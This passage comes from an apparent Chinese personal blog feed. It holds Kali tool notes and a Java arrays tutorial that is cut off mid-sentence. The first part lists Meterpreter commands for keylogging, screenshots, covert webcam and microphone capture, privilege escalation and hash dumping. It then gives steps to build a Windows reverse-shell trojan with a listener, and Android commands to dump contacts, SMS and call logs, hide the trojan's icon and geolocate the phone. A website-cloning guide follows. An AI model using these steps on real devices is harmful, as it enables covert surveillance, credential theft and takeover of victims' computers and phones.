Commands（用户接口命令）<br>enumdesktops    --&gt;列出所有可访问的桌面和窗口站（窗体列表）<br>getdesktop      --&gt;得到当前的Meterpreter桌面<br>idletime        --&gt;返回秒远程用户已经闲置数量<br>keyscan_start   --&gt;开始捕获击键（开始键盘记录）<br>keyscan_dump    --&gt;转储按键缓冲（下载键盘记录）<br>keyscan_stop    --&gt;停止捕获击键（停止键盘记录）<br><br>PS：键盘记录注意点，先开始，后下载，再结束，否则会出错<br>screenshot      --&gt;抓取交互式桌面截图（当前操作界面截图一张）<br>setdesktop      --&gt;改变meterpreters当前桌面<br>uictl           --&gt;控制一些用户界面组件（获取键盘、鼠标控制权）<br>使用uictl -h 查看帮助（打开/关闭，键盘/鼠标）<br><br>摄像头：Stdapi: Webcam Commands（摄像头命令）<br>record_mic       --&gt;X秒从默认的麦克风record_mic音频记录（音频录制）<br>webcam_chat      --&gt;开始视频聊天（视频，对方会有弹窗）<br>webcam_list      --&gt;单摄像头（查看摄像头列表）<br>webcam_snap      --&gt;采取快照从指定的摄像头（摄像头拍摄一张照片）<br>webcam_stream    --&gt;播放视频流从指定的摄像头（开启摄像头监控）<br><br>其他命令操作<br>getsystem        --&gt;获取高权限<br>hashdump         --&gt;获取当前用户hash<br></code></pre></div></td></tr></table></figure><hr><h2 id="第二种用法"><a href="#第二种用法" class="headerlink" title="第二种用法"></a>第二种用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><br>msfpayload windows/meterpreter/reverse_tcp LHOST=本机IP LPORT=<span class="hljs-number">4444</span>端口 x &gt; /root/Desktop/<span class="hljs-number">1.</span>exe<br>这样就会在桌面生成<span class="hljs-number">1.</span>exe 也就是我们的木马<br><span class="hljs-number">2.</span><br>输入msfconsole 进入msf<br><span class="hljs-number">3.</span><br>依次输入以下命令 <br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_top<br><span class="hljs-built_in">set</span> LHOST 本机Ip<br><span class="hljs-comment">//set lport 端口号</span><br>exploit<br>等到windows运行了<span class="hljs-number">1.</span>exe后 就Ok<br><span class="hljs-number">4.</span><br>meterpreter的命令直接-h 看帮助<br></code></pre></div></td></tr></table></figure><h1 id="MSF入侵Android"><a href="#MSF入侵Android" class="headerlink" title="MSF入侵Android"></a>MSF入侵Android</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>开启摄像头<br>  webcam_stream<br><span class="hljs-number">2.</span>导出手机号码<br>  dump_contacts<br><span class="hljs-number">3.</span>导出短信<br>  dump_sms<br><span class="hljs-number">4.</span>通过摄像头拍照功能<br>  webcam_snap<br><span class="hljs-number">5.</span>从目标会话发送短消息<br>  send_sms<br><span class="hljs-number">6.</span>隐秘拍照功能<br>  webcam_snap<br><span class="hljs-number">7.</span>从指定的摄像头获取快照<br>  webcam_snap<br><span class="hljs-number">8.</span>检查设备是否有根<br>  check_root<br><span class="hljs-number">9.</span>隐藏手机端木马程序图标<br>  hide_app_icon<br><span class="hljs-number">10.</span>获取通话记录<br>  dump_calllog<br><span class="hljs-number">11.</span>获取手机的当前的经纬度<br>  geolocate<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-Msfvenom &amp; Msfconsole</title>
    <link href="/2021/04/11/Kali-msfvenom%20&amp;%20msfconsole/"/>
    <url>/2021/04/11/Kali-msfvenom%20&amp;%20msfconsole/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="安装WPScan"><a href="#安装WPScan" class="headerlink" title="安装WPScan"></a>安装WPScan</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">apt-get update<br>apt-get install wpscan<br></code></pre></div></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-httrack(网站克隆)</title>
    <link href="/2021/04/11/Kali-httrack(%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86)/"/>
    <url>/2021/04/11/Kali-httrack(%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86)/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="在Kali-Linux-2020中安装httrack"><a href="#在Kali-Linux-2020中安装httrack" class="headerlink" title="在Kali Linux 2020中安装httrack"></a>在Kali Linux 2020中安装httrack</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>打开终端，输入 sudo su进入root用户<br><span class="hljs-number">2.</span>提示输入密码后输入密码<br><span class="hljs-number">3.</span>再输入 apt-get install httrack进行下载安装即可。<br></code></pre></div></td></tr></table></figure><h2 id="在终端中"><a href="#在终端中" class="headerlink" title="在终端中"></a>在终端中</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">创建存储的文件夹<br>mkdir web <span class="hljs-comment">//web为文件名</span><br></code></pre></div></td></tr></table></figure><h2 id="在httrack中"><a href="#在httrack中" class="headerlink" title="在httrack中"></a>在httrack中</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>输入httrack<br><span class="hljs-number">2.</span>再随便输入一个项目名<br><span class="hljs-number">3.</span>/home/dragon/web <span class="hljs-comment">//2018版本中 /root/web，web为你建的文件夹名</span><br><span class="hljs-number">4.</span>再输入网站的网址或IP<br><span class="hljs-number">5.</span>再选择<span class="hljs-number">1</span>或<span class="hljs-number">2</span>(一般选<span class="hljs-number">1</span>或<span class="hljs-number">2</span>，通常选<span class="hljs-number">2</span>)<br><span class="hljs-number">6.</span>再一直回车，遇到输入就输入Y（yes）即可<br><br>当出现done,thinks <span class="hljs-keyword">for</span> <span class="hljs-keyword">using</span> 时，表示克隆完成。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(四)-数组</title>
    <link href="/2021/04/11/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%9B%9B)-%E6%95%B0%E7%BB%84/"/>
    <url>/2021/04/11/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%9B%9B)-%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(四)，数组复习。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-声明数组变量"><a href="#1-声明数组变量" class="headerlink" title="1.声明数组变量"></a>1.声明数组变量</h3><blockquote><p>1.声明创建数组</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">10</span>]; <span class="hljs-comment">//首选</span><br><span class="hljs-keyword">int</span> aa[]=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">10</span>]; <span class="hljs-comment">//C/C++形式，效果相同，但不是最好的选择</span><br><span class="hljs-keyword">int</span>[] b=&#123;<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>&#125;; <span class="hljs-comment">//创建并初始化</span><br></code></pre></div></td></tr></table></figure><blockquote><p>2.加强for（For-Each循环）<br>JDK 1.5 引进了一种新的循环类型，被称为 For-Each 循环或者加强型循环，它能在不使用下标的情况下遍历数组。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(type element: array)&#123; <br>    System.out.println(element);<br>&#125;<br>如：<br><span class="hljs-keyword">int</span>[] a=&#123;<span class="hljs-number">12</span>,<span class="hljs-number">51</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> t:a)&#123;<br>System.out.println(t);<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">12</span><br><span class="hljs-number">51</span><br><span class="hljs-number">6</span><br><span class="hljs-number">6</span><br><span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><blockquote><p>3.数组作为函数的参数<br>数组可以作为参数传递给方法。例如：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] array)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; array.length; i++) &#123;<br>    System.out.print(array[i] + <span class="hljs-string">&quot; &quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">//调用方法输出结果</span><br>printArray(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>&#125;);<br></code></pre></div></td></tr></table></figure><blockquote><p>4.函数作为函数的返回值</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>[] reverse(<span class="hljs-keyword">int</span>[] list) &#123;<br>  <span class="hljs-keyword">int</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[list.length];<br> <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = result.length - <span class="hljs-number">1</span>; i &lt; list.length; i++, j--) &#123;<br>    result[j] = list[i];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-多维数组"><a href="#2-多维数组" class="headerlink" title="2.多维数组"></a>2.多维数组</h3><p>多维数组可以看成是数组的数组，比如二维数组就是一个特殊的一维数组，其每一个元素都是一个一维数组。</p><blockquote><p>一.直接为一维分配空间</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[][] b=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">5</span>][<span class="hljs-number">2</span>];<br></code></pre></div></td></tr></table></figure><blockquote><p>二.分别为一维分配空间</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s[][] = <span class="hljs-keyword">new</span> String[<span class="hljs-number">2</span>][]; <span class="hljs-comment">//这里的String 可以换成其他类型</span><br>s[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> String[<span class="hljs-number">2</span>];<span class="hljs-comment">//为最高维分配引用空间，也就是为最高维限制其能保存数据的最长的长度,下同。</span><br>s[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> String[<span class="hljs-number">3</span>];<br>s[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;Good&quot;</span>); <span class="hljs-comment">//为其每个数组元素单独分配空间，下同</span><br>s[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;Luck&quot;</span>);<br>s[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;to&quot;</span>);<br>s[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;you&quot;</span>);<br>s[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>] = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;!&quot;</span>);<br></code></pre></div></td></tr></table></figure><h3 id="3-Arrays-类"><a href="#3-Arrays-类" class="headerlink" title="3.Arrays 类"></a>3.Arrays 类</h3><p>java.util.Arrays 类能方便地操作数组，它提供的所有方法都是静态的。<br>具有一下功能：</p><blockquote><p>1.给数组赋值：通过 fill 方法。<br>2.对数组排序：通过 sort 方法,按升序。sort只提供升序排序，并不支持降序排序。但可以倒序输出即可。如果一定要用 sort 实现降序排序，可以参考《java知识拓展》博文。<br>3.比较数组：通过 equals 方法比较数组中元素值是否相等。<br>4.查找数组元素：通过 binarySearch 方法能对排序好的数组进行二分查找法操作。</p></blockquote><h4 id="Java中Arrays类的常用方法"><a href="#Java中Arrays类的常用方法" class="headerlink" title="Java中Arrays类的常用方法"></a>Java中Arrays类的常用方法</h4><blockquote><p>1.Arrays类位于 java.util 包中，主要包含了操作数组的各种方法。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br></code></pre></div></td></tr></table></figure><blockquote><p>2.Arrays.fill(); //填充数组</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//实用一</span><br>    <span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">5</span>];<span class="hljs-comment">//新建一个大小为5的数组</span><br>Arrays.fill(arr,<span class="hljs-number">4</span>);<span class="hljs-comment">//给所有值赋值4</span><br>String str = Arrays.toString(arr); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br>System.out.print(str);<br><span class="hljs-comment">//输出：[4, 4, 4, 4, 4]</span><br><br><span class="hljs-comment">//实用二</span><br><span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">5</span>];<span class="hljs-comment">//新建一个大小为5的数组</span><br>Arrays.fill(arr,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>);<span class="hljs-comment">//[2,4) 下标从0开始。下标为2（包括）到下标为4（不包括）全部赋值为6</span><br>String str = Arrays.toString(arr); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br>System.out.print(str);<br><span class="hljs-comment">//输出：[0, 0, 6, 6, 0]</span><br></code></pre></div></td></tr></table></figure><blockquote><p>3.Arrays.sort(); //数组排序</p></blockquote><p>Arrays类有一个静态方法sort，利用这个方法可传入要排序的数组进去排序，因为传入的是一个数组的引用，所以排序完成的结果也通过这个引用来更改数组。</p><p><strong>1.数字排序</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] intArray = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[] &#123; <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">23</span> &#125;;<br>Arrays.sort(intArray);<br><span class="hljs-comment">//输出： [-23, 1, 3, 4]</span><br></code></pre></div></td></tr></table></figure><p><strong>2.字符串排序，先大写后小写</strong><br>因为大写字母的ASCII码比小写字母的小。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String[] strArray = <span class="hljs-keyword">new</span> String[] &#123; “z”, “a”, “C” &#125;;<br>Arrays.sort(strArray);<br><span class="hljs-comment">//输出： [C, a, z]</span><br></code></pre></div></td></tr></table></figure><p><strong>3.严格按字母表顺序排序，也就是忽略大小写排序</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String[] strArray = <span class="hljs-keyword">new</span> String[] &#123; “z”, “a”, “C” &#125;;<br>   Arrays.sort(strArray, String.CASE_INSENSITIVE_ORDER);<br>   <span class="hljs-comment">//输出： [a, C, z]</span><br></code></pre></div></td></tr></table></figure><p><strong>4.反向排序</strong><br>在数字数组中可以实现降序排序。大写字母的ASCII码比小写字母的小。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String[] strArray = <span class="hljs-keyword">new</span> String[] &#123; “z”, “a”, “C” &#125;;<br>   Arrays.sort(strArray, Collections.reverseOrder());<br>   <span class="hljs-comment">//输出：[z, a, C]</span><br></code></pre></div></td></tr></table></figure><p><strong>5.忽略大小写反向排序</strong><br>可以理解成把所有的字母转换成对应小写字母或大写字母。转换成一种进行比较。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String[] strArray = <span class="hljs-keyword">new</span> String[] &#123; “z”, “a”, “C” &#125;;<br>   Arrays.sort(strArray, String.CASE_INSENSITIVE_ORDER);<br>   Collections.reverse(Arrays.asList(strArray));<br>   <span class="hljs-comment">//输出： [z, C, a]</span><br></code></pre></div></td></tr></table></figure><p><strong>6.选择数组指定位置进行排序</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>&#125;;<br>Arrays.sort(arr,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>);<span class="hljs-comment">//[0,3)，小标0开始。 从小标0开始（包括）到下标为3（不包括）的区间进行排序</span><br>String str = Arrays.toString(arr); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br>System.out.print(str);<br><span class="hljs-comment">//输出：[1, 2, 3, 5, 4]</span><br></code></pre></div></td></tr></table></figure><blockquote><p>4.Arrays.toString(); //将数组中的内容全部打印出来</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">   <span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>&#125;;<br>   System.out.print(arr);<span class="hljs-comment">//直接将数组打印输出</span><br>   <span class="hljs-comment">//输出：[I@7852e922 (数组的地址)</span><br><br>String str = Arrays.toString(arr); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br><span class="hljs-comment">//System.out.print(str);</span><br><span class="hljs-comment">//输出：[3, 2, 1, 5, 4]</span><br></code></pre></div></td></tr></table></figure><blockquote><p>5.Arrays.equals(); //比较数组元素是否相等</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-keyword">int</span>[] arr2 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>System.out.println(Arrays.equals(arr1,arr2));<br><span class="hljs-comment">//输出：true</span><br><span class="hljs-comment">//如果是arr1.equals(arr2),则返回false，因为equals比较的是两个对象的地址，不是里面的数，而Arrays.equals重写了equals，所以，这里能比较元素是否相等。至于‘=’与equals的区别可见另一篇博文《java知识拓展》。</span><br></code></pre></div></td></tr></table></figure><blockquote><p>6.Arrays.binarySearch(); //二分查找法找指定元素的索引值（下标）</p></blockquote><p>数组一定是排好序的，否则会出错。找到元素，只会返回最后一个位置。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br>System.out.println(Arrays.binarySearch(arr, <span class="hljs-number">30</span>));<br>   <span class="hljs-comment">//输出：2 （下标索引值从0开始）</span><br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br>System.out.println(Arrays.binarySearch(arr, <span class="hljs-number">36</span>));<br><span class="hljs-comment">//输出：-4 （找不到元素，返回-x，从-1开始数，如题，返回-4）</span><br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> []arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br>System.out.println(Arrays.binarySearch(arr, <span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>));<br><span class="hljs-comment">//输出：2 （从0到3位（不包括）找30，找到了，在第2位，返回2）</span><br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> []arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br>System.out.println(Arrays.binarySearch(arr, <span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">40</span>));<br><span class="hljs-comment">//输出：-4 （从0到3位（不包括）找40，找不到，从-1开始数，返回-4）</span><br></code></pre></div></td></tr></table></figure><blockquote><p>7.Arrays.copeOf() 和Arrays.copeOfRange(); //截取数组</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br><span class="hljs-keyword">int</span>[] arr1 = Arrays.copyOf(arr, <span class="hljs-number">3</span>);<span class="hljs-comment">//[0,3)。下标从0开始，到下标为3为止(不包括3)。</span><br>String str = Arrays.toString(arr1); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br>System.out.print(str);<br><span class="hljs-comment">//输出：[10, 20, 30] （截取arr数组的3个元素赋值给姓数组arr1）</span><br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> []arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br><span class="hljs-keyword">int</span> []arr1 = Arrays.copyOfRange(arr,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<br>String str = Arrays.toString(arr1); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br>System.out.print(str);<br><span class="hljs-comment">//输出：[20, 30] （从第1位（0开始）截取到第3位（不包括）</span><br></code></pre></div></td></tr></table></figure><h3 id="4-数组容量扩充"><a href="#4-数组容量扩充" class="headerlink" title="4.数组容量扩充"></a>4.数组容量扩充</h3><p>数组容量如果不够用可以使用 